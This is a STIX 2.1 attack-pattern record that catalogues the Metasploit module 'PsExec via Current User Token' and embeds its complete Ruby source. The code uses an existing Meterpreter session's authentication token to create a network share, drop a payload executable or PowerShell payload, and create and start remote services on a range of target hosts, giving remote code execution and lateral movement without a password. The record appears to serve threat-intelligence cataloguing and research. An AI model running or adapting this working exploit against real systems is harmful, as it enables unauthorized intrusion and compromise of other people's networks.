{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24f703e1-8943-4374-a83c-53484acfcce6",
    "created": "2024-08-14T16:48:57.219182Z",
    "modified": "2024-08-14T16:48:57.219186Z",
    "name": "PsExec via Current User Token",
    "description": " This module uploads an executable file to the victim system, creates a share containing that executable, creates a remote service on each target system using a UNC path to that file, and finally starts the service(s).  The result is similar to psexec but with the added benefit of using the session's current authentication token instead of having to know a password or hash.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/current_user_psexec.rb",
            "external_id": "current_user_psexec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Post::Windows::Services\n  include Exploit::EXE\n  include Exploit::Powershell\n  include Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PsExec via Current User Token',\n        'Description' => %q{\n          This module uploads an executable file to the victim system, creates\n          a share containing that executable, creates a remote service on each\n          target system using a UNC path to that file, and finally starts the\n          service(s).\n\n          The result is similar to psexec but with the added benefit of using\n          the session's current authentication token instead of having to know\n          a password or hash.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'egypt',\n          'jabra' # Brainstorming and help with original technique\n        ],\n        'References' => [\n          # same as for windows/smb/psexec\n          [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)\n          [ 'OSVDB', '3106'],\n          [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]\n        ],\n        'DefaultOptions' => {\n          'WfsDelay' => 10,\n        },\n        'DisclosureDate' => '1999-01-01',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [ [ 'Universal', {} ] ],\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_mkdir\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new(\"INTERNAL_ADDRESS\", [\n        false,\n        \"Session's internal address or hostname for the victims to grab the \" +\n        \"payload from (Default: detected)\"\n      ]),\n      OptString.new(\"NAME\", [ false, \"Service name on each target in RHOSTS (Default: random)\" ]),\n      OptString.new(\"DISPNAME\", [ false, \"Service display name (Default: random)\" ]),\n      OptEnum.new(\"TECHNIQUE\", [ true, \"Technique to use\", 'PSH', ['PSH', 'SMB'] ]),\n      OptAddressRange.new(\"RHOSTS\", [ false, \"Target address range or CIDR identifier\" ]),\n      OptBool.new(\"KERBEROS\", [ true, \"Authenticate via Kerberos, dont resolve hostnames\", false ])\n    ])\n  end\n\n  def exploit\n    name = datastore[\"NAME\"] || Rex::Text.rand_text_alphanumeric(10)\n    display_name = datastore[\"DISPNAME\"] || Rex::Text.rand_text_alphanumeric(10)\n    if datastore['TECHNIQUE'] == 'SMB'\n      # XXX Find the domain controller\n\n      # share_host = datastore[\"INTERNAL_ADDRESS\"] || detect_address\n      share_host = datastore[\"INTERNAL_ADDRESS\"] || session.session_host\n      print_status \"Using #{share_host} as the internal address for victims to get the payload from\"\n\n      # Build a random name for the share and directory\n      share_name = Rex::Text.rand_text_alphanumeric(8)\n      drive = session.sys.config.getenv('SYSTEMDRIVE')\n      share_dir = \"#{drive}\\\\#{share_name}\"\n\n      # Create them\n      print_status(\"Creating share #{share_dir}\")\n      session.fs.dir.mkdir(share_dir)\n      cmd_exec(\"net share #{share_name}=#{share_dir}\")\n\n      # Generate an executable from the shellcode and drop it in the share\n      # directory\n      filename = \"#{Rex::Text.rand_text_alphanumeric(8)}.exe\"\n      payload_exe = generate_payload_exe_service(\n        :servicename => name,\n        # XXX Ghetto\n        :arch => payload.send(:pinst).arch.first\n      )\n\n      print_status(\"Dropping payload #{filename}\")\n      write_file(\"#{share_dir}\\\\#{filename}\", payload_exe)\n\n      service_executable = \"\\\\\\\\#{share_host}\\\\#{share_name}\\\\#{filename}\"\n    else\n      service_executable = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n    end\n\n    begin\n      if datastore['KERBEROS']\n        targets = datastore['RHOSTS'].split(', ').map { |a| a.split(' ') }.flatten\n      else\n        targets = Rex::Socket::RangeWalker.new(datastore[\"RHOSTS\"])\n      end\n\n      targets.each do |server|\n        begin\n          print_status(\"#{server.ljust(16)} Creating service #{name}\")\n\n          service_create(name,\n                         {\n                           :display => display_name,\n                           :path => service_executable,\n                           :starttype => \"START_TYPE_MANUAL\"\n                         },\n                         server)\n\n          # If everything went well, this will create a session. If not, it\n          # might be permissions issues or possibly we failed to create the\n          # service.\n          print_status(\"#{server.ljust(16)} Starting the service\")\n          service_start(name, server)\n\n          print_status(\"#{server.ljust(16)} Deleting the service\")\n          service_delete(name, server)\n        rescue Rex::TimeoutError\n          vprint_status(\"#{server.ljust(16)} Timed out...\")\n          next\n        rescue RuntimeError, ::Rex::Post::Meterpreter::RequestError\n          print_error(\"Exception running payload: #{$!.class} : #{$!}\")\n          print_warning(\"#{server.ljust(16)} WARNING: May have failed to clean up!\")\n          print_warning(\"#{server.ljust(16)} Try a command like: sc \\\\\\\\#{server}\\\\ delete #{name}\")\n          next\n        end\n      end\n    ensure\n      if datastore['TECHNIQUE'] == 'SMB'\n        print_status(\"Deleting share #{share_name}\")\n        cmd_exec(\"net share #{share_name} /delete /y\")\n        print_status(\"Deleting files #{share_dir}\")\n        cmd_exec(\"cmd /c rmdir /q /s #{share_dir}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}